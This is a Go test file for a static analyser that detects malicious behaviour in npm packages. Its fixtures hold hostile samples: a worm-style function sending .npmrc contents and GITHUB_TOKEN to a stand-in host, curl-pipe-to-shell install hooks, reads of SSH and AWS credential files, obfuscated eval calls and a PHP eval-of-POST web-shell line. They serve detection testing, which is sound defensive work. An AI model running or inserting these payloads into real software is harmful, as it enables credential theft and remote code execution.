// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"strings"
	"testing"

	"github.com/RhythmShahriar/sightread/core"
)

func jsFeatures(src string) []core.Feature {
	return codeFeatures(langJS, "package/index.js", []byte(src), core.CtxCode)
}

// shaiHulud is shaped like the 2025 worm's payload: it reads the npm
// credentials and a token, then posts them.
const shaiHulud = `const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

function collect() {
  const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  const token = process.env.GITHUB_TOKEN;
  const req = https.request({ hostname: 'exfil.example', method: 'POST', path: '/c' });
  req.write(JSON.stringify({ npmrc, token }));
  req.end();
}
collect();
`

func TestJSFeatures(t *testing.T) {
	runFeatureCases(t, langJS, []featureCase{
		// FCall: program starts and imports.
		{"destructured exec", `const { exec } = require('child_process'); exec(cmd);`, core.FCall, "child_process.exec", nil, true},
		{"inline spawn", `require('child_process').spawn('sh', ['-c', x]);`, core.FCall, "child_process.spawn", map[string]string{"arg0": "sh"}, true},
		{"default import", `import cp from 'child_process'; cp.execSync('id');`, core.FCall, "child_process.execSync", nil, true},
		{"import fs", `const fs = require('fs');`, core.FCall, "import:fs", nil, true},
		{"import https", `import https from 'node:https';`, core.FCall, "import:https", map[string]string{"module": "node:https"}, true},
		{"dynamic import vm", `const vm = await import('vm');`, core.FCall, "import:vm", nil, true},
		{"module.require", `module.require('child_process').execSync(x);`, core.FCall, "child_process.execSync", nil, true},
		{"module.require import", `module.require('child_process').execSync(x);`, core.FCall, "import:child_process", nil, true},
		{"mainModule require", `process.mainModule.require('child_process').exec(x);`, core.FCall, "child_process.exec", nil, true},
		{"mainModule import", `process.mainModule.require('child_process').exec(x);`, core.FCall, "import:child_process", nil, true},
		{"built module import", `require('child' + '_process').exec(x);`, core.FCall, "import:child_process", map[string]string{"module": "child_process"}, true},
		{"other object require", `loader.require('child_process');`, core.FCall, "import:child_process", nil, false},
		{"require of data", `require(name);`, core.FCall, "*", nil, false},
		{"exec without import", `exec(cmd);`, core.FCall, "child_process.exec", nil, false},
		{"regexp exec", `/x/.exec(s);`, core.FCall, "*", nil, false},
		{"commented spawn", `// require('child_process').exec(x)`, core.FCall, "*", nil, false},
		{"fs-extra", `const fse = require('fs-extra');`, core.FCall, "import:fs", nil, false},
		{"react", `import React from 'react';`, core.FCall, "*", nil, false},

		// FWrite: the target classes are in TestJSWriteTargets.
		{"npmrc", `fs.writeFileSync(path.join(os.homedir(), '.npmrc'), x);`, core.FWrite, "npmrc", map[string]string{"fn": "fs.writeFileSync"}, true},
		{"bashrc", `fs.appendFileSync(process.env.HOME + '/.bashrc', x);`, core.FWrite, "homedir", nil, true},
		{"workflow", `fs.writeFile('.github/workflows/ci.yml', x, cb);`, core.FWrite, "ci", map[string]string{"ext": ".yml"}, true},
		{"read only", `const s = fs.readFileSync(path.join(os.homedir(), '.npmrc'));`, core.FWrite, "*", nil, false},
		{"stream write", `stream.write(chunk);`, core.FWrite, "*", nil, false},
		{"response head", `res.writeHead(200);`, core.FWrite, "*", nil, false},

		// FEnvRead.
		{"github token", `const t = process.env.GITHUB_TOKEN;`, core.FEnvRead, "GITHUB_TOKEN", nil, true},
		{"bracket", `const t = process.env['NPM_TOKEN'];`, core.FEnvRead, "NPM_TOKEN", nil, true},
		{"destructured", `const { AWS_SECRET_ACCESS_KEY, HOME } = process.env;`, core.FEnvRead, "AWS_SECRET_ACCESS_KEY", nil, true},
		{"whole env", `send(JSON.stringify(process.env));`, core.FEnvRead, "*", nil, true},
		{"alias", `const env = process.env; post(env.MY_API_KEY);`, core.FEnvRead, "MY_API_KEY", nil, true},
		{"node env", `if (process.env.NODE_ENV === 'production') {}`, core.FEnvRead, "*", nil, false},
		{"child env", `spawn(cmd, { env: process.env });`, core.FEnvRead, "*", nil, false},
		{"home", `const h = process.env.HOME;`, core.FEnvRead, "*", nil, false},
		{"spread", `const e = { ...process.env, DEBUG: '1' };`, core.FEnvRead, "*", nil, false},

		// FSend.
		{"shai-hulud", shaiHulud, core.FSend, "https.request", map[string]string{"reads": "env,creds"}, true},
		{"fetch", `fetch('https://api.example.com/x', { method: 'POST', body });`, core.FSend, "fetch", nil, true},
		{"axios", `const axios = require('axios'); axios.post(u, d);`, core.FSend, "axios.post", nil, true},
		{"dns", `const dns = require('dns'); dns.resolveTxt(name, cb);`, core.FSend, "dns.resolveTxt", map[string]string{"channel": "dns"}, true},
		{"method named fetch", `store.fetch(id);`, core.FSend, "*", nil, false},
		{"own helper", `myFetch(u);`, core.FSend, "*", nil, false},
		{"commented fetch", `// fetch(u)`, core.FSend, "*", nil, false},
		{"fetch host", `fetch('https://collect.evil-cdn.com/x', { method: 'POST', body });`, core.FSend, "fetch",
			map[string]string{"host": "collect.evil-cdn.com", "domain": "evil-cdn.com"}, true},
		{"socket host", `const net = require('net'); net.connect(4444, '198.51.100.7');`, core.FSend, "net.connect",
			map[string]string{"host": "198.51.100.7"}, true},
		{"fetch built host", `fetch(base + '/x', { body });`, core.FSend, "fetch", map[string]string{"host": "", "local": ""}, true},
		{"loopback v6 fetch", `fetch('http://[::1]:3000/x', { method: 'POST', body });`, core.FSend, "fetch",
			map[string]string{"host": "", "local": "::1"}, true},
		{"loopback socket", `const net = require('net'); net.connect(4444, '127.0.0.2');`, core.FSend, "net.connect",
			map[string]string{"host": "", "local": "127.0.0.2"}, true},

		// FEval.
		{"eval", `eval(x);`, core.FEval, "eval", map[string]string{"arg": "dynamic"}, true},
		{"new Function", `const f = new Function('a', body);`, core.FEval, "Function", nil, true},
		{"vm", `const vm = require('vm'); vm.runInNewContext(code);`, core.FEval, "vm.runInNewContext", nil, true},
		{"string timer", `setTimeout('alert(1)', 10);`, core.FEval, "setTimeout", map[string]string{"arg": "literal"}, true},
		{"eval atob", `eval(atob(s));`, core.FEval, "eval", map[string]string{"decode": "true"}, true},
		{"optional call", `eval?.(location.hash);`, core.FEval, "eval", nil, true},
		{"constructor chain", `[].constructor.constructor(process.env.X)();`, core.FEval, "Function", map[string]string{"source": "env"}, true},
		{"object constructor chain", `obj.constructor.constructor(code)();`, core.FEval, "Function", nil, true},
		{"Reflect.apply", `Reflect.apply(eval, null, [x]);`, core.FEval, "eval", map[string]string{"via": "Reflect.apply"}, true},
		{"then Function", `p.then(Function);`, core.FEval, "Function", map[string]string{"via": "p.then"}, true},
		{"map eval", `codes.map(window.eval);`, core.FEval, "eval", nil, true},
		{"this built name", `const n = ['e','v','a','l'].join(''); this[n](x);`, core.FEval, "eval", nil, true},
		{"self built name", `self[['e','v','a','l'].join('')](x);`, core.FEval, "eval", nil, true},
		{"optional method", `obj?.run?.(x); a?.[0];`, core.FEval, "*", nil, false},
		{"one constructor", `const C = x.constructor; new C(code);`, core.FEval, "*", nil, false},
		{"then function", `p.then(evaluate).then(fn);`, core.FEval, "*", nil, false},
		{"string eval argument", `log('eval', 'Function');`, core.FEval, "*", nil, false},
		{"webpack global", `g = g || new Function("return this")();`, core.FEval, "*", nil, false},
		{"function timer", `setTimeout(() => tick(), 10);`, core.FEval, "*", nil, false},
		{"named timer", `setInterval(tick, 100);`, core.FEval, "*", nil, false},
		{"eval method", `parser.eval(x);`, core.FEval, "*", nil, false},

		// FDynCall.
		{"built global", `window['ev' + 'al'](x);`, core.FDynCall, "eval", map[string]string{"source": "folded"}, true},
		{"require variable", `const m = require(name);`, core.FDynCall, "require", map[string]string{"source": "unknown"}, true},
		{"require env", `require(process.env.PLUGIN);`, core.FDynCall, "require", map[string]string{"source": "env"}, true},
		{"require literal", `require('fs');`, core.FDynCall, "*", nil, false},
		{"this built global", `const n = ['e','v','a','l'].join(''); this[n](x);`, core.FDynCall, "eval", map[string]string{"source": "folded"}, true},
		{"this built method", `this['handle' + 'Click'](e);`, core.FDynCall, "*", nil, false},
		{"computed method", `obj[method]();`, core.FDynCall, "*", nil, false},
		{"plain call", `fn();`, core.FDynCall, "*", nil, false},

		// FCredRead.
		{"npmrc read", `fs.readFileSync(path.join(os.homedir(), '.npmrc'));`, core.FCredRead, "npmrc", nil, true},
		{"ssh read", `fs.readFile('~/.ssh/id_rsa', cb);`, core.FCredRead, "ssh", nil, true},
		{"aws through a variable", `const p = os.homedir() + '/.aws/credentials'; fs.readFileSync(p);`, core.FCredRead, "aws", nil, true},
		{"package json", `fs.readFileSync('package.json');`, core.FCredRead, "*", nil, false},
		{"own file", `fs.readFileSync(path.join(__dirname, 'x.txt'));`, core.FCredRead, "*", nil, false},
		{"write", `fs.writeFileSync('.npmrc', x);`, core.FCredRead, "*", nil, false},
	})
}

func TestJSWriteTargets(t *testing.T) {
	tests := []struct{ src, want string }{
		{`fs.writeFileSync(path.join(os.homedir(), '.npmrc'), x);`, tgtNpmrc},
		{`fs.writeFileSync(os.homedir() + '/.ssh/authorized_keys', k);`, tgtSSH},
		{`fs.writeFileSync('.git/hooks/pre-commit', s);`, tgtGit},
		{`fs.writeFileSync('.github/workflows/x.yml', s);`, tgtCI},
		{`fs.copyFileSync(src, '../../evil.js');`, tgtParentDir},
		{`fs.writeFile(path.join(__dirname, 'dist', 'x.js'), s, cb);`, tgtOwn},
		{`fs.writeFileSync(os.tmpdir() + '/x', s);`, tgtTemp},
		{`fs.writeFileSync(process.env.HOME + '/.profile', s);`, tgtHome},
		{`fs.promises.writeFile(target, s);`, tgtUnknown},
		{`const { homedir } = require('os'); fs.writeFileSync(homedir() + '/.x', s);`, tgtHome},
	}
	for _, tc := range tests {
		var got []string
		for _, f := range jsFeatures(tc.src) {
			if f.Kind == core.FWrite {
				got = append(got, f.Key)
			}
		}
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("%s: write targets %q, want [%s]", tc.src, got, tc.want)
		}
	}
}

func TestShaiHuludShape(t *testing.T) {
	fs := jsFeatures(shaiHulud)
	for _, want := range []string{"cred-read:npmrc", "env-read:GITHUB_TOKEN", "send:https.request", "call:import:https", "call:import:fs"} {
		found := false
		for _, f := range fs {
			if f.SetKey() == want {
				found = true
				if f.Ev.Func != "collect" && want != "call:import:https" && want != "call:import:fs" {
					t.Errorf("%s in %q, want collect", want, f.Ev.Func)
				}
			}
		}
		if !found {
			t.Errorf("no %s in %q", want, describe(fs))
		}
	}
}

func TestPackageJSONHooks(t *testing.T) {
	tests := []struct {
		name   string
		src    string
		hasGyp bool
		want   map[string]string // feature key -> script attr
	}{
		{"postinstall", `{"name": "x", "scripts": {"test": "jest", "postinstall": "node setup.js"}}`, false,
			map[string]string{"npm:postinstall": "node setup.js"}},
		{"several", `{"scripts": {"preinstall": "curl -s https://x.example/i | sh", "prepare": "husky install", "prepublish": "tsc"}}`, false,
			map[string]string{"npm:preinstall": "curl -s https://x.example/i | sh", "npm:prepare": "husky install", "npm:prepublish": "tsc"}},
		{"gypfile", `{"gypfile": true, "scripts": {"test": "mocha"}}`, false, map[string]string{"npm:gyp": "node-gyp rebuild"}},
		{"binding.gyp in the tree", `{"name": "native"}`, true, map[string]string{"npm:gyp": "node-gyp rebuild"}},
		{"build scripts only", `{"scripts": {"build": "tsc", "test": "jest", "lint": "eslint ."}}`, false, map[string]string{}},
		{"own install script wins over gyp", `{"scripts": {"install": "node-gyp-build"}}`, true, map[string]string{"npm:install": "node-gyp-build"}},
		{"empty script", `{"scripts": {"postinstall": ""}}`, false, map[string]string{}},
		{"not json", `{"scripts": {`, true, map[string]string{}},
		{"script not a string", `{"scripts": {"postinstall": ["x"]}}`, false, map[string]string{}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := map[string]string{}
			for _, f := range packageJSONFeatures("package.json", []byte(tc.src), tc.hasGyp) {
				if f.Kind != core.FHook {
					t.Errorf("kind %s", f.Kind)
				}
				got[f.Key] = f.Attrs["script"]
			}
			if len(got) != len(tc.want) {
				t.Fatalf("hooks %v, want %v", got, tc.want)
			}
			for k, v := range tc.want {
				if got[k] != v {
					t.Errorf("%s script %q, want %q", k, got[k], v)
				}
			}
		})
	}
}

func TestPackageJSONHookLine(t *testing.T) {
	src := "{\n  \"name\": \"x\",\n  \"description\": \"postinstall helper\",\n  \"scripts\": {\n    \"postinstall\": \"node setup.js\"\n  }\n}\n"
	fs := packageJSONFeatures("package.json", []byte(src), false)
	if len(fs) != 1 || fs[0].Ev.Line != 5 {
		t.Fatalf("features %+v, want npm:postinstall on line 5", fs)
	}
}

func TestPackageJSONMasksSecrets(t *testing.T) {
	key := "npm" + "_" + "Fk3sightreadTEST0nly4Fixtures9xQ2wZa"
	src := `{"scripts": {"postinstall": "curl -H 'Authorization: Bearer ` + key + `' https://x.example | sh"}}`
	for _, f := range packageJSONFeatures("package.json", []byte(src), false) {
		if s := f.Attrs["script"]; s == "" || strings.Contains(s, key) {
			t.Errorf("script attr %q shows the key or is empty", s)
		}
	}
}

func TestAnalyzeTextShell(t *testing.T) {
	tests := []struct {
		name   string
		script string
		want   string // a SetKey that must be present, or "" for none of flow and include
	}{
		{"curl pipe sh", "curl -fsSL https://x.example/i.sh | sh", "flow:remote->exec"},
		{"wget pipe bash", "wget -qO- https://x.example/i | bash -s -- --yes", "flow:remote->exec"},
		{"process substitution", "bash <(curl -s https://x.example/i)", "flow:remote->exec"},
		{"command substitution", `sh -c "$(wget -qO- https://x.example/i)"`, "flow:remote->exec"},
		{"after a cd", "cd scripts && curl https://x.example/a | node", "flow:remote->exec"},
		{"node file", "node setup.js", "include:setup.js"},
		{"node with env", "NODE_OPTIONS=--x cross-env A=1 node ./scripts/post.js --flag", "include:scripts/post.js"},
		{"sh file", "sh ./install.sh", "include:install.sh"},
		{"node -e", `node -e "require('child_process').exec('id')"`, "call:child_process.exec"},
		{"node-gyp", "node-gyp rebuild", ""},
		{"husky", "husky install", ""},
		{"download only", "curl -o x.tgz https://x.example/x.tgz && tar xzf x.tgz", ""},
		{"quoted pipe", `echo "curl x | sh"`, ""},
		{"comment", "# curl https://x.example | sh", ""},
		{"node module preload", "node -r ts-node/register", ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			fs := textFeatures(core.KindText, "package.json", []byte(tc.script))
			keys := featureKeys(fs)
			if tc.want == "" {
				for _, k := range keys {
					if k == "flow:remote->exec" || strings.HasPrefix(k, "include:") {
						t.Errorf("unexpected %s in %q", k, keys)
					}
				}
				return
			}
			found := false
			for _, k := range keys {
				found = found || k == tc.want
			}
			if !found {
				t.Errorf("features %q, want %s", keys, tc.want)
			}
		})
	}
}

func TestAnalyzeTextCode(t *testing.T) {
	if !matchFeature(textFeatures(core.KindPHP, "x.php", []byte(`<?php eval($_POST['c']);`)), core.FFlow, "request->eval", nil) {
		t.Error("PHP text not analysed as PHP")
	}
	if !matchFeature(textFeatures(core.KindJS, "x.js", []byte(`eval(process.env.X)`)), core.FFlow, "env->eval", nil) {
		t.Error("JS text not analysed as JavaScript")
	}
}

// FuzzAnalyzeText runs shell text, package.json and JavaScript through
// the npm side of extraction: no panic, every feature on a line of the
// input.
func FuzzAnalyzeText(f *testing.F) {
	for _, s := range []string{
		"curl -fsSL https://x.example/i.sh | sh",
		`sh -c "$(wget -qO- https://x.example/i)" && node -e 'eval(x)'`,
		`{"scripts": {"postinstall": "node setup.js"}, "gypfile": true}`,
		"node \"unterminated",
		shaiHulud,
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 16<<10 {
			return
		}
		lines := strings.Count(s, "\n") + 1
		var all []core.Feature
		all = append(all, textFeatures(core.KindText, "package.json", []byte(s))...)
		all = append(all, packageJSONFeatures("package.json", []byte(s), true)...)
		all = append(all, jsFeatures(s)...)
		for _, ft := range all {
			if ft.Ev.Line < 1 || ft.Ev.Line > lines || ft.Ev.EndLine < ft.Ev.Line {
				t.Errorf("%s at lines %d-%d of %d", ft.SetKey(), ft.Ev.Line, ft.Ev.EndLine, lines)
			}
		}
		for _, w := range shellWords(s) {
			if w == "" && !strings.ContainsAny(s, `"'`) {
				t.Errorf("empty word from %q", s)
			}
		}
	})
}
